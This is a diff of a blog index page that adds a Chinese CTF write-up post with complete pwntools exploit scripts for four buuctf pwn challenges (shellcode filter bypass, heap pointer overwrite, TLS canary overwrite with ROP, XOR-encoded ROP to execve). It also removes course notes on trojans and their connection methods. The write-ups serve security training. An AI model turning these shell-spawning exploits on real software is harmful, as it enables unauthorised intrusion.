@@ -150,6 +150,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/25/buuctf-pwn-write-ups-13/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (13)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-25 17:14:12" itemprop="dateCreated datePublished" datetime="2023-03-25T17:14:12+08:00">2023-03-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-03 22:18:07" itemprop="dateModified" datetime="2023-04-03T22:18:07+08:00">2023-04-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu102-starctf_2019_babyshell"><a class="markdownIt-Anchor" href="#buu102-starctf_2019_babyshell"></a> buu102-starctf_2019_babyshell</h1>
+<p>这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	sa(<span class="string">b&#x27;give me shellcode, plz:\n&#x27;</span>, <span class="string">b&#x27;\x00\x2f&#x27;</span> + asm(shellcraft.amd64.sh()))</span><br><span class="line">	io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu103-actf_2019_babyheap"><a class="markdownIt-Anchor" href="#buu103-actf_2019_babyheap"></a> buu103-actf_2019_babyheap</h1>
+<p>一道简单的堆排布问题，错开分配到控制chunk，改函数指针，/bin/sh在程序中已经有了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26355</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">ita = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line">binsh = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+<h1 id="buu193-starctf2018_babystack"><a class="markdownIt-Anchor" href="#buu193-starctf2018_babystack"></a> buu193-starctf2018_babystack</h1>
+<p>前面的题目大同小异，这里就直接跳到第7页开始做了，看看能不能学点新东西。<br />
+这道题有一个<code>pthread_create</code>函数创建了一个新的线程，在这个线程中有一个很大的栈溢出。这里我们需要通过对程序内存空间的分析理解本题的利用思路。<br />
+本题创建的线程的栈正好位于TLS结构体下面，TLS结构体位于libc加载基地址的前一页。记得TLS在house of emma中提到过，其中包含了canary的值，而本题中正好有canary，因此要溢出就必须溢出到覆盖canary的值。幸运的是，本题是可以实现的。<br />
+我们可以通过ret2csu调用read函数写入一个one gadget到bss段中某处，然后通过调用puts函数获取到libc的基地址，最后进行栈迁移将rsp修改为写one gadget的地址，最后调用one gagdet。这里进行栈迁移的主要目的是确保栈空间的完全纯净，因为几乎所有的one gadget都要求栈中某个地方的值为0。另外此题不能通过调用<code>system</code>函数的方式getshell，因为此时我们已经覆盖了TLS结构体，无法成功调用system函数，而one gadget通常都是使用syscall指令来get shell的，因此没有影响。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">poprdi = <span class="number">0x400c03</span></span><br><span class="line">poprsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400A9B</span></span><br><span class="line">poprbp = <span class="number">0x400870</span></span><br><span class="line">gad = <span class="number">0x400BFA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want to send?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x2000</span>).encode())</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(<span class="number">0</span>) + cyclic(<span class="number">4104</span> - <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># canary</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(gad)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)	<span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)	<span class="comment"># pop r13</span></span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)	<span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop r15</span></span><br><span class="line">payload += p64(<span class="number">0x400BE0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(poprbp)</span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(base + <span class="number">0x4f322</span>) * <span class="number">4</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu194-ciscn_2019_s_8"><a class="markdownIt-Anchor" href="#buu194-ciscn_2019_s_8"></a> buu194-ciscn_2019_s_8</h1>
+<p>这道题就是考ROP，一个静态编译，能够找到很多的gadget。下面使用的是<code>system('/bin/sh')</code>的方式。首先需要将字符串/bin/sh写到一个地方，通过对程序的逆向分析可以找到read函数的地址。输入完成之后就是调用syscall。尤其需要注意get shell的参数。第一个参数（rdi）保存字符串<code>/bin/sh</code>的地址，第二个参数（rsi）保存字符串<code>sh</code>的<strong>二重指针地址</strong>，注意是二重指针。因为<code>/bin/sh</code>里面已经有<code>sh</code>，所以直接可以偏移5个字符，不过我们传入rsi的值应该是保存有这个偏移5个字节的地址的地址，那么之前在写的时候就需要顺便写一个地址值。然后rdx赋值0即可。<br />
+另外本题有一个函数会对输入进行处理，经过简单分析即可得知是为每个字节异或0x66，写gadget的时候异或一下就行了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25478</span>)</span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x4006e6</span></span><br><span class="line">poprsi = <span class="number">0x4040fe</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">poprsp = <span class="number">0x400d22</span></span><br><span class="line">poprax = <span class="number">0x449b9c</span></span><br><span class="line">poprbx = <span class="number">0x4005ee</span></span><br><span class="line">poprcx = <span class="number">0x400be2</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">pushrsp = <span class="number">0x482997</span>	<span class="comment"># call rdx</span></span><br><span class="line">poprsirbp = <span class="number">0x40f99e</span></span><br><span class="line">movrdirbp = <span class="number">0x422c45</span>	<span class="comment"># call rax</span></span><br><span class="line">syscall = <span class="number">0x44C177</span>	<span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">read = <span class="number">0x449be0</span></span><br><span class="line">bss = <span class="number">0x6BC300</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span> + <span class="number">8</span> - <span class="number">8</span> * <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(pushrsp ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(bss - 0x300 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0x1000 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(7 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0xA ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(read ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0x2 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0xbss ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0) * 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64((bss + <span class="number">8</span>) ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(syscall ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Please enter your Password: &#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(bss + <span class="number">5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2290,166 +2396,6 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC7%E7%AB%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC7%E7%AB%A0/" class="post-title-link" itemprop="url">软件安全——第7章</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-03-03 09:44:41 / Modified: 09:47:34" itemprop="dateCreated datePublished" datetime="2023-03-03T09:44:41+08:00">2023-03-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">软件安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="chapter-7-木马与后门"><a class="markdownIt-Anchor" href="#chapter-7-木马与后门"></a> Chapter 7 木马与后门</h1>
-<h2 id="71-木马基本概念"><a class="markdownIt-Anchor" href="#71-木马基本概念"></a> 7.1 木马基本概念</h2>
-<p>通过欺骗或诱骗的方式安装，并在用户的计算机中隐藏以实现控制用户计算机的目的。<br />
-<strong>属于具有远程控制、信息窃取、破坏等功能的恶意代码</strong></p>
-<p>特点：欺骗性、隐藏性、非授权性、交互性</p>
-<h2 id="72-木马分类"><a class="markdownIt-Anchor" href="#72-木马分类"></a> 7.2 木马分类</h2>
-<ul>
-<li>远程控制型木马：能够进行远程控制的木马，攻击者与被控制端有双向交互。例：灰鸽子、广外女生</li>
-<li>信息获取型木马：进行信息窃取的木马，被控制端到攻击者的单向交互。</li>
-<li>破坏型木马：进行数据破坏、资源消耗（包括挖矿）的木马，有攻击者到被控制者的单向交互或无交互。</li>
-</ul>
-<h2 id="73-木马植入方式"><a class="markdownIt-Anchor" href="#73-木马植入方式"></a> 7.3 木马植入方式</h2>
-<ul>
-<li>网页挂马植入：即黑客在入侵某些网站后将自己的木马嵌入到其网站的页面上，使用户点开页面后自动下载木马。</li>
-<li>电子邮件植入：将木马程序以附件形式在邮件中传播。有时将电子邮件与网页挂马相结合，使得不选中附件也能传播木马。</li>
-<li>文档捆绑植入：使用office和pdf文档的漏洞等进行植入。</li>
-<li>伪装欺骗植入：通过修改命名、后缀、图标等欺骗电脑用户点击后植入。</li>
-<li>捆绑植入：如exe捆绑、文档嵌入、多媒体文件、电子书植入等。<strong>木马捆绑是把一个有界面的正常程序，和一个后门程序捆绑在一起从而制作一个木马。</strong></li>
-<li>其他：社会工程学。</li>
-</ul>
-<h2 id="74-木马的通信方式"><a class="markdownIt-Anchor" href="#74-木马的通信方式"></a> 7.4 木马的通信方式</h2>
-<ul>
-<li>传输通道构建信息：黑客获取数据等的交互需要黑客提供自己机器的IP地址、端口、第三方网址等信息才能进行</li>
-<li>建立通道连接的方式有：正向连接和反向连接。
-<ul>
-<li>正向连接：黑客端主动连接被控制端以获取目标机器的信息。
-<ul>
-<li>优点：攻击者无需外部IP地址、木马样本不会泄露自身的IP地址</li>
-<li>缺点：可能会被防火墙阻挡、被攻击者必须提供外部IP地址（否则被攻击者若在局域网中，则IP地址可能不固定，难以形成长期连接）、定位被攻击者相对困难（被攻击者的IP地址和上线时间不确定）</li>
-</ul>
-</li>
-<li>反向连接：
-<ul>
-<li><strong>方案1</strong>：被控制端直接连接黑客控制端
-<ul>
-<li>优点：较容易通过防火墙、攻击目标可以实现上线即控制、可控制局域网中的目标</li>
-<li>缺点：会暴露控制服务器信息、攻击者需要具备外部IP地址</li>
-</ul>
-</li>
-<li><strong>方案2</strong>：被控制端与控制端之间由肉鸡连接，间接通信
-<ul>
-<li>优点：可以绕过防火墙、攻击目标可以实现上线即控制、不易被发现（因为是代理，因此不会暴露攻击者自己的信息）</li>
-<li>缺点：肉鸡从哪来，需要保障肉鸡的稳定性</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>使用的通信协议
-<ul>
-<li>TCP协议：传输稳定，但容易被发现，有正向和反向两种形式
-<ul>
-<li>HTTP协议伪装：如果黑客能够截取目标机器的数据包，就可以对HTTP协议包做出一定的修改，这种攻击的成功率很大，但前提是必须能够让黑客的机器充当目标机器的代理服务器。</li>
-</ul>
-</li>
-<li>UDP协议：负载较小，但传输不稳定，有正向和反向两种形式</li>
-<li>ICMP + TCP/UDP：由于ICMP报文一般由内核处理，因此一般不会被防火墙处理，可以在ICMP报文上做手脚。</li>
-<li>BITS（Background Intelligent Transfer Service）：一个后门，适用于Windows2000/XP/2003，在进程管理器中不可见，平时没有端口，提供正向和反向连接两种方式</li>
-</ul>
-</li>
-</ul>
-<h2 id="75-远控木马"><a class="markdownIt-Anchor" href="#75-远控木马"></a> 7.5 远控木马</h2>
-<ol>
-<li>结构：木马配置程序、控制端程序（客户端）、被控制端程序（服务器）</li>
-<li>功能：文件、进程、服务、注册表管理，监控摄像头、语音、键盘、桌面，开shell等</li>
-</ol>
-<h2 id="76-木马防御思路"><a class="markdownIt-Anchor" href="#76-木马防御思路"></a> 7.6 木马防御思路</h2>
-<ul>
-<li>静态文件特征检测</li>
-<li>网络流量特征检测</li>
-<li>系统行为特征检测</li>
-<li>功能行为特征检测</li>
-<li>攻击意图检测等</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2519,7 +2465,7 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-count">145</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
